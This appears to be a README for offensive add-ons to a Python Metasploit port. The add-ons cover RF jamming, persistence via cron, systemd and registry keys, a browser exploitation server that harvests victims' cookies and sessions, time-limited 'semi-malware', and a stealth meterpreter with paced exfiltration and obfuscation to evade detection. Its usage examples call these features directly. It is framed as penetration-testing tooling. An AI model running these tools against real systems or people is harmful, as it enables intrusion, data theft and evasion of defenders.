# Advanced Tool Integrations for Metasploit PyNative

## Overview

This directory contains integration modules for external tools that provide unique capabilities not found in standard Metasploit Framework. These integrations make PyMetasploit more powerful and versatile for modern penetration testing.

## Available Integrations

### 1. RFKilla Integration (`rfkilla.py`)

**Purpose:** RF (Radio Frequency) exploitation and jamming capabilities

**Features:**
- RF signal jamming
- Wireless device control (block/unblock)
- SDR (Software Defined Radio) integration ready
- Signal analysis foundation

**Usage:**
```python
from lib.msf.core.integrations.rfkilla import RFKillaIntegration

rfkilla = RFKillaIntegration()
if rfkilla.initialize():
    # List RF devices
    result = rfkilla.execute('list')
    devices = result['devices']
    
    # Block a device
    rfkilla.execute('block', target='0')
    
    # Unblock a device
    rfkilla.execute('unblock', target='0')
    
    rfkilla.cleanup()
```

**Module:** `modules/auxiliary/integration/rfkilla_jammer.py`

**Use Cases:**
- Testing wireless resilience
- Demonstrating RF attacks
- Security assessments of wireless infrastructure

---

### 2. PhoenixBoot Integration (`phoenixboot.py`)

**Purpose:** Persistence and protection framework

**Features:**
- Cross-platform persistence mechanisms (cron, systemd, registry, startup)
- Self-healing capabilities
- Process monitoring
- Configuration backup

**Usage:**
```python
from lib.msf.core.integrations.phoenixboot import PhoenixBootIntegration

phoenixboot = PhoenixBootIntegration()
if phoenixboot.initialize():
    # Add persistence
    result = phoenixboot.execute('add_persistence', 
                                 payload='/path/to/payload',
                                 method='auto')
    
    if result['success']:
        print(f"Persistence added via: {result['method']}")
    
    phoenixboot.cleanup()
```

**Persistence Methods:**
- **Linux/macOS:** cron, systemd, startup scripts
- **Windows:** registry Run keys, startup folder

**Use Cases:**
- Realistic persistence testing
- Red team operations
- Defensive testing

---

### 3. ChromPwnPanel Integration (`chrompwn.py`)

**Purpose:** Browser exploitation server (similar to BeEF)

**Features:**
- Browser fingerprinting
- Cookie/localStorage exfiltration
- Session hijacking
- Custom payload delivery
- Real-time victim tracking

**Usage:**
```python
from lib.msf.core.integrations.chrompwn import ChromPwnPanelIntegration

config = {'host': '0.0.0.0', 'port': 8080}
panel = ChromPwnPanelIntegration(config)

if panel.initialize():
    # Start server
    panel.execute('start')
    
    # Wait for victims...
    
    # Check victims
    result = panel.execute('list_victims')
    print(f"Victims: {result['victims']}")
    
    # Get exfiltrated data
    result = panel.execute('get_data')
    print(f"Data: {result['data']}")
    
    # Stop server
    panel.execute('stop')
    panel.cleanup()
```

**Module:** `modules/auxiliary/integration/chrompwn_server.py`

**Use Cases:**
- Browser-based exploitation
- XSS payload delivery
- Phishing campaigns
- Client-side testing

---

### 4. Self-Destruct Semi-Malware (`self_destruct.py`)

**Purpose:** Time-limited, self-removing malware for realistic testing

**Features:**
- Automatic time-based deactivation
- Self-removal attempts
- Fallback logging with clear uninstall instructions
- Cross-platform support (Windows, Linux, macOS)

**The Problem This Solves:**
Malicious actors can plant persistent malware, but testers often cannot due to cleanup requirements. This framework provides time-limited malware that automatically removes itself, making testing more realistic while maintaining ethical standards.

**Usage:**
```python
from lib.msf.core.self_destruct import SelfDestructMalware

def my_payload():
    # Your payload code here
    print("Executing payload...")
    return {'status': 'success'}

# Create malware that expires in 24 hours
malware = SelfDestructMalware(
    lifetime_hours=24,
    payload_callback=my_payload
)

# Run the payload
result = malware.run()

if result['expired']:
    print("Malware expired and removed")
else:
    print(f"Time remaining: {result['time_remaining']}")
```

**Standalone Payload Creation:**
```python
from lib.msf.core.self_destruct import create_self_destruct_payload

# Create standalone payload script
payload_path = create_self_destruct_payload(lifetime_hours=24)
print(f"Payload created: {payload_path}")
```

**Safety Features:**
- Automatic deactivation after time limit
- Attempts self-removal on expiration
- If removal fails, emits clear logs with instructions
- Logs written to system log (syslog/Event Log)
- Fallback log file created with removal instructions

**Use Cases:**
- Realistic persistence testing
- Time-limited red team exercises
- Safe malware development training
- Ethical penetration testing

---

### 5. Advanced Meterpreter (`advanced_meterpreter.py`)

**Purpose:** Modern stealth techniques for meterpreter

**Features:**
- Network behavior analysis
- Adaptive exfiltration strategies
- Code obfuscation for heuristic defeat
- Simple, effective protocols
- User behavior mimicking

**Philosophy:**
> "The best malware is barely malware" - This implementation focuses on blending in with normal network traffic rather than complex evasion techniques.

**Usage:**
```python
from lib.msf.core.advanced_meterpreter import StealthMeterpreter

meterpreter = StealthMeterpreter()
meterpreter.start()

# Queue data for exfiltration
meterpreter.queue_exfiltration(b"sensitive data", priority=5)

# Exfiltrate using adaptive strategy
result = meterpreter.exfiltrate_data()
print(f"Strategy: {result['strategy']}")
print(f"Bytes sent: {result['bytes_sent']}")

# Generate obfuscated payload
payload_code = "print('hello')"
obfuscated = meterpreter.generate_obfuscated_payload(payload_code)

meterpreter.stop()
```

**Exfiltration Strategies:**
- **Slow Drip:** Low bandwidth users (2KB chunks, 5min intervals)
- **Steady Stream:** Moderate users (10KB chunks, 2min intervals)
- **Chunked Burst:** High bandwidth users (50KB chunks, 1min intervals)

**Use Cases:**
- Stealth payload delivery
- Evading behavioral detection
- Realistic threat simulation
- Advanced red team operations

---

## Integration Framework

All integrations inherit from `BaseIntegration` class:

```python
from lib.msf.core.integrations import BaseIntegration, IntegrationRegistry

class MyIntegration(BaseIntegration):
    def check_dependencies(self):
        # Check if required tools/libs are available
        return (True, [])
    
    def initialize(self):
        # Initialize the integration
        return True
    
    def execute(self, *args, **kwargs):
        # Main functionality
        return {'success': True}
    
    def cleanup(self):
        # Clean up resources
        pass

# Register integration
IntegrationRegistry.register('myintegration', MyIntegration)
```

### Using the Registry

```python
from lib.msf.core.integrations import IntegrationRegistry

# List all integrations
integrations = IntegrationRegistry.list_all()

# Get specific integration
IntegrationClass = IntegrationRegistry.get('rfkilla')
integration = IntegrationClass()
```

---

## Binary Analysis Tools Research

See [BINARY_ANALYSIS_TOOLS.md](../../documentation/integrations/BINARY_ANALYSIS_TOOLS.md) for comprehensive research on integrating:

- **iaito/radare2** (Free, Good automation)
- **Ghidra** (Free, Excellent decompiler)
- **Binary Ninja** (Commercial, Superior IL)
- **IDA Pro** (Commercial, Industry standard)

The research document includes:
- Feature comparison matrix
- Integration roadmap
- Code examples
- Technical architecture
- Implementation plan

---

## Installation

### Prerequisites

Most integrations have minimal dependencies. Specific requirements:

1. **RFKilla Integration:**
   - `rfkill` utility (usually pre-installed on Linux)
   - Root/sudo access for RF control

2. **PhoenixBoot Integration:**
   - Write access to system directories (for persistence)
   - Varies by platform and persistence method

3. **ChromPwnPanel Integration:**
   - Available network port (default: 8080)
   - Python standard library (no extra dependencies)

4. **Self-Destruct Semi-Malware:**
   - Python standard library
   - Write access to temp directory

5. **Advanced Meterpreter:**
   - Python standard library
   - Network access for exfiltration

### Setup

1. **Clone Repository:**
   ```bash
   git clone https://github.com/P4X-ng/metasploit-framework-pynative
   cd metasploit-framework-pynative
   ```

2. **Set Python Path:**
   ```bash
   export PYTHONPATH="${PYTHONPATH}:$(pwd)"
   ```

3. **Test Integration:**
   ```bash
   # Test RFKilla
   python3 lib/msf/core/integrations/rfkilla.py
   
   # Test ChromPwnPanel
   python3 lib/msf/core/integrations/chrompwn.py
   
   # Test Self-Destruct
   python3 lib/msf/core/self_destruct.py
   
   # Test Advanced Meterpreter
   python3 lib/msf/core/advanced_meterpreter.py
   ```

---

## Security Considerations

### Important Notes

1. **Legal Use Only:** These tools are for authorized security testing only
2. **Cleanup:** Always clean up after testing (especially persistence mechanisms)
3. **Logging:** All integrations log activities for audit purposes
4. **Permissions:** Some features require elevated privileges
5. **Network:** Some features require network access and may be detected

### Self-Destruct Malware Safety

The self-destruct framework is designed with safety in mind:

- ✅ **Time-limited:** Automatically deactivates after expiration
- ✅ **Self-removing:** Attempts to remove itself on expiration
- ✅ **Logged:** Emits clear removal instructions if self-removal fails
- ✅ **Documented:** Provides step-by-step uninstall instructions
- ✅ **Cross-platform:** Works on Windows, Linux, macOS

**Always test in isolated environments first!**

---

## Examples

### Example 1: Complete RF Jamming Test

```python
#!/usr/bin/env python3
from lib.msf.core.integrations.rfkilla import RFKillaIntegration
import time

# Initialize
rfkilla = RFKillaIntegration()
rfkilla.initialize()

# List devices
result = rfkilla.execute('list')
print(f"Found {len(result['devices'])} devices")

# Block WiFi for 30 seconds
if result['devices']:
    device_id = result['devices'][0]['id']
    
    print(f"Blocking device {device_id}...")
    rfkilla.execute('block', target=device_id)
    
    time.sleep(30)
    
    print(f"Unblocking device {device_id}...")
    rfkilla.execute('unblock', target=device_id)

# Cleanup
rfkilla.cleanup()
```

### Example 2: Browser Exploitation Campaign

```python
#!/usr/bin/env python3
from lib.msf.core.integrations.chrompwn import ChromPwnPanelIntegration
import time

# Setup server
panel = ChromPwnPanelIntegration({'port': 8080})
panel.initialize()
panel.execute('start')

print("Server running. Send victims to: http://your-ip:8080/")
print("Press Ctrl+C to stop and view results...")

try:
    # Run for 1 hour
    time.sleep(3600)
except KeyboardInterrupt:
    pass

# Show results
victims = panel.execute('list_victims')
data = panel.execute('get_data')

print(f"\n=== Results ===")
print(f"Victims: {len(victims['victims'])}")
print(f"Exfiltrated items: {len(data['data'])}")

# Cleanup
panel.cleanup()
```

### Example 3: Time-Limited Persistence Test

```python
#!/usr/bin/env python3
from lib.msf.core.self_destruct import SelfDestructMalware
from lib.msf.core.integrations.phoenixboot import PhoenixBootIntegration

def test_payload():
    print("[*] Payload executing...")
    # Simulate payload activity
    return {'executed': True}

# Create self-destruct malware that expires in 1 hour
malware = SelfDestructMalware(
    lifetime_hours=1,
    payload_callback=test_payload
)

# Add persistence (will be removed when malware expires)
phoenixboot = PhoenixBootIntegration()
phoenixboot.initialize()

# Create temporary payload script
import tempfile
fd, payload_path = tempfile.mkstemp(suffix='.py')
with os.fdopen(fd, 'w') as f:
    f.write('#!/usr/bin/env python3\nprint("Hello")')

# Add persistence
result = phoenixboot.execute('add_persistence', 
                            payload=payload_path, 
                            method='auto')

print(f"Persistence added: {result}")
print(f"Will self-destruct in: {malware.time_remaining()}")

# Run payload
malware.run()
```

---

## Contributing

To add a new integration:

1. Create integration class inheriting from `BaseIntegration`
2. Implement required methods: `check_dependencies()`, `initialize()`, `execute()`, `cleanup()`
3. Register with `IntegrationRegistry`
4. Create auxiliary module in `modules/auxiliary/integration/`
5. Add documentation and examples
6. Test thoroughly

---

## Testing

Each integration includes a `__main__` block for testing:

```bash
# Test individual integrations
python3 lib/msf/core/integrations/rfkilla.py
python3 lib/msf/core/integrations/phoenixboot.py
python3 lib/msf/core/integrations/chrompwn.py
python3 lib/msf/core/self_destruct.py
python3 lib/msf/core/advanced_meterpreter.py

# Test auxiliary modules
python3 modules/auxiliary/integration/rfkilla_jammer.py
python3 modules/auxiliary/integration/chrompwn_server.py
```

---

## License

All integrations are licensed under MSF_LICENSE (BSD 3-clause).

---

## Author

P4x-ng (https://github.com/P4X-ng)

---

## Version

- **Version:** 1.0.0
- **Last Updated:** 2025-11-22
- **Status:** Active Development

---

## Future Enhancements

See [BINARY_ANALYSIS_TOOLS.md](../../documentation/integrations/BINARY_ANALYSIS_TOOLS.md) for planned binary analysis tool integrations.

Additional planned features:
- [ ] pf-web-* integration for advanced web injection
- [ ] Automated exploit generation from binary analysis
- [ ] Machine learning-based vulnerability detection
- [ ] Distributed analysis capabilities
- [ ] Cloud-based payload generation
- [ ] Advanced IoC extraction and correlation

---

## Support

For issues or questions:
- GitHub Issues: https://github.com/P4X-ng/metasploit-framework-pynative/issues
- GitHub Discussions: https://github.com/P4X-ng/metasploit-framework-pynative/discussions
